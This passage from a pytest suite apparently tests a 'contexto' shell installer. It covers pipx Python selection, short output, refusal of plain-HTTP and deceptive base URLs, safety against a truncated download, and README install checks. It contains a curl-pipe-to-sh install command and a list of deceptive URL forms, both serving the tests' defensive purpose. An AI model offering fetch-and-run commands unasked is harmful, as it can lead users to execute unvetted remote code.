    assert "contexto 0.0.1" in result.stderr and "1.2.3" in result.stderr and str(box.bin) in result.stderr


# --- Python for pipx ---


def test_pipx_default_python_is_used_when_it_is_new_enough(make_box):
    box = make_box(tools=("pipx",))
    box.hub.add("1.2.3")
    ok(box.run())
    assert "--python" not in box.changes()[0]


def test_pipx_with_an_old_default_python_gets_a_newer_one_from_path(make_box):
    box = make_box(tools=("pipx",))
    box.stub("python3.11", "python-old")
    newer = box.stub("python3.13", "python-new")
    box.hub.add("1.2.3")
    ok(box.run(STUB_PIPX_PYTHON=str(box.old_python)))
    wheel = f"{box.tmpdir}/{_tmp_name(box)}/contexto-1.2.3-py3-none-any.whl"
    assert box.changes() == [f"pipx install --python {newer} {wheel}"]


def test_pipx_too_old_to_name_its_python_gets_one_from_path(make_box):
    box = make_box(tools=("pipx",))
    newer = box.stub("python3.12", "python-new")
    box.hub.add("1.2.3")
    ok(box.run(STUB_PIPX_NO_ENVIRONMENT="1"))
    assert f"--python {newer}" in box.changes()[0]


def test_pipx_with_no_python_3_12_or_later_stops_before_any_download(make_box):
    box = make_box(tools=("pipx",))
    box.stub("python3", "python-old")
    box.hub.add("1.2.3")
    failed(box.run(STUB_PIPX_PYTHON=str(box.old_python)), "Python 3.12", "Nothing was installed")
    box.assert_untouched()
    assert box.hub.requests == []


# --- Output ---


def test_output_is_short_and_says_session_data_is_kept(box):
    box.hub.add("1.2.3")
    result = ok(box.run())
    assert "~/.contexto" in result.stdout and "not touched" in result.stdout
    assert len(result.stdout.splitlines()) <= 12
    assert result.stderr == ""
    assert ok(box.run("--force", CONTEXTO_HOME="/somewhere/else")).stdout.count("/somewhere/else") == 1
    assert (box.home / ".contexto" / "session.json").read_text() == "kept"


def test_a_path_hint_is_printed_when_the_command_is_not_on_path(box):
    box.hub.add("1.2.3")
    path = os.pathsep.join(map(str, (box.stubs, box.system)))
    result = ok(box.run(PATH=path))
    assert "not on PATH" in result.stdout
    assert f'export PATH="{box.bin}:$PATH"' in result.stdout
    assert "contexto 1.2.3" in result.stdout
    assert "not on PATH" not in ok(box.run("--force")).stdout


def test_already_up_to_date_is_seen_when_the_command_is_not_on_path(box):
    box.preinstall("uv", "contexto", "1.2.3")
    box.hub.add("1.2.3")
    path = os.pathsep.join(map(str, (box.stubs, box.system)))
    result = ok(box.run(PATH=path))
    assert "already installed" in result.stdout
    box.assert_untouched()


# --- The base URL ---


def test_a_base_url_override_is_announced(box):
    box.hub.add("1.2.3")
    assert f"CONTEXTO_INSTALL_BASE_URL={box.hub.url}" in ok(box.run()).stdout


@pytest.mark.parametrize("url", [
    "http://example.invalid/owner/repo",
    "http://127.0.0.1.example.invalid/owner/repo",
    "http://127.0.0.1:80@example.invalid/owner/repo",
    "http://localhost.example.invalid/owner/repo",
    "ftp://127.0.0.1/owner/repo",
    "file:///tmp/owner/repo",
    "127.0.0.1/owner/repo",
    "https://user@example.invalid/owner/repo",
])
def test_plain_http_is_refused_except_for_this_machine(box, url):
    box.hub.add("1.2.3")
    failed(box.run(CONTEXTO_INSTALL_BASE_URL=url), "CONTEXTO_INSTALL_BASE_URL")
    box.assert_untouched()
    assert box.hub.requests == []


def test_localhost_by_name_is_accepted(box):
    box.hub.add("1.2.3")
    ok(box.run(CONTEXTO_INSTALL_BASE_URL=box.hub.url.replace("127.0.0.1", "localhost") + "/"))
    assert box.installed() == {"uv:contexto": "1.2.3"}


def test_the_default_base_url_is_github_over_https():
    text = SCRIPT.read_text()
    assert "https://github.com/VentureForgre/contexto" in text
    assert "--proto" in text and "--tlsv1.2" in text
    assert "http://github.com" not in text


# --- Piped, truncated, and static checks ---


@pytest.mark.parametrize("shell,how", [(shell, "stdin") for shell in SHELLS] + [(SH, "pipe")])
def test_the_script_runs_from_standard_input(box, shell, how):
    box.hub.add("1.2.3")
    result = ok(box.run(shell=shell, how=how))
    assert result.stdout.rstrip().splitlines()[-1] == "contexto 1.2.3"
    assert box.installed() == {"uv:contexto": "1.2.3"}


@pytest.mark.parametrize("how", ["stdin", "pipe"])
def test_options_reach_a_piped_script(box, how):
    box.hub.add("1.2.3")
    result = ok(box.run("--dry-run", "--with", "pipx", how=how))
    assert "Would run: pipx install" in result.stdout
    box.assert_untouched()


def cut_points(text: bytes) -> list[int]:
    """Every byte of the last two lines, and a spread of line starts and other bytes before them."""
    starts = [index + 1 for index, byte in enumerate(text) if byte == 0x0A]
    tail = starts[-3]
    return sorted({*starts[:-1:12], *range(1, tail, 997), *range(tail, len(text) - 1)})


@pytest.mark.parametrize("shell", SHELLS)
def test_a_truncated_script_does_nothing(box, shell, tmp_path):
    """A download cut short at any byte runs no command, even with the cut inside the last line."""
    box.hub.add("1.2.3")
    text = SCRIPT.read_bytes()
    assert text.endswith(b'\nmain "$@" --end-of-script\n')
    points = cut_points(text)
    if shell != SH:  # the other shells get the last line and a thinner spread
        tail = len(text) - len(b'main "$@" --end-of-script\n')
        points = [point for index, point in enumerate(points) if point >= tail or index % 6 == 0]
    part = tmp_path / "part.sh"
    for point in points:
        part.write_bytes(text[:point])
        # --dry-run is the argument a cut must not drop: without it the script would install.
        result = box.run("--dry-run", shell=shell, how="stdin", script=part)
        where = f"cut at byte {point} of {len(text)}: {text[max(0, point - 30):point]!r}"
        assert box.calls() == [], where
        assert box.hub.requests == [], where
        assert "Would run" not in result.stdout, where
    box.assert_untouched()


def test_the_end_marker_is_required(box, tmp_path):
    """`main "$@"` alone, which is what a cut inside the last line can leave, refuses to run."""
    box.hub.add("1.2.3")
    text = SCRIPT.read_text()
    part = tmp_path / "part.sh"
    part.write_text(text.replace('main "$@" --end-of-script\n', 'main "$@"\n'))
    failed(box.run(script=part), "incomplete")
    part.write_text(text.replace('main "$@" --end-of-script\n', "main\n"))
    failed(box.run("--dry-run", how="stdin", script=part), "incomplete")
    box.assert_untouched()
    assert box.hub.requests == []


def test_the_script_never_uses_sudo_eval_or_a_shell_profile():
    lines = [line.split("#", 1)[0] for line in SCRIPT.read_text().splitlines()]
    code = "\n".join(lines)
    assert not re.search(r"(^|[;&|(\s])(sudo|eval|source)\s", code)
    for profile in (".bashrc", ".zshrc", ".profile", ".bash_profile", "/etc/"):
        assert profile not in code, profile
    assert lines[0] == "" and SCRIPT.read_text().startswith("#!/bin/sh\n")
    assert "set -eu" in lines


def test_shellcheck_is_clean():
    shellcheck = shutil.which("shellcheck")
    if not shellcheck:
        pytest.skip("shellcheck is not on PATH")
    result = subprocess.run([shellcheck, "-s", "sh", str(SCRIPT)], capture_output=True, text=True)
    assert result.returncode == 0, result.stdout + result.stderr


@pytest.mark.parametrize("name", ["dash", "bash", "sh"])
def test_syntax_check(name):
    shell = shutil.which(name)
    if not shell:
        pytest.skip(f"{name} is not on PATH")
    result = subprocess.run([shell, "-n", str(SCRIPT)], capture_output=True, text=True)
    assert result.returncode == 0, result.stderr


# --- README.md: the Install section ---


def install_section() -> str:
    text = README.read_text()
    start = text.index("\n## Install\n")
    return text[start:text.index("\n## Quickstart\n", start)]


def test_readme_names_the_release_version_in_exactly_one_line():
    lines = [line for line in README.read_text().splitlines() if "/releases/download/v" in line]
    assert len(lines) == 1, "one line of README.md carries a release download URL"
    line = lines[0]
    section = install_section()
    assert line in section.splitlines(), "and it is in the Install section"
    tag = re.search(r"/releases/download/v(\d+\.\d+\.\d+)/", line)[1]
    assert line.count(tag) == 2, "the version is in the URL twice: the tag and the wheel's name"
    assert section.count(tag) == 2, f"{tag} appears nowhere else in the Install section"


def test_readme_install_section_links_resolve():
    section = install_section()
    text = README.read_text()
    anchors = {re.sub(r"[^a-z0-9 -]", "", heading.lower()).replace(" ", "-")
               for heading in re.findall(r"^#{1,6} +(.+?) *$", text, flags=re.M)}
    links = re.findall(r"\]\(([^)\s]+)\)", section)
    assert links
    for link in links:
        if link.startswith(("https://", "http://")):
            continue
        path, _, fragment = link.partition("#")
        if path:
            assert (ROOT / path).exists(), f"{link} points at a file that does not exist"
        elif fragment:
            assert fragment in anchors, f"{link} points at a heading that does not exist"
    for anchor in ("checking-the-download", "uninstall", "platforms", "upgrade"):
        assert f"\n### {anchor.replace('-', ' ').capitalize()}\n" in section, anchor


def test_readme_install_section_has_the_one_line_install():
    section = install_section()
    assert "curl -fsSL https://raw.githubusercontent.com/VentureForgre/contexto/main/install.sh | sh" in section
    assert "contexto-proxy" in section and "docs/install.md" in section
    assert (ROOT / "docs" / "install.md").exists()
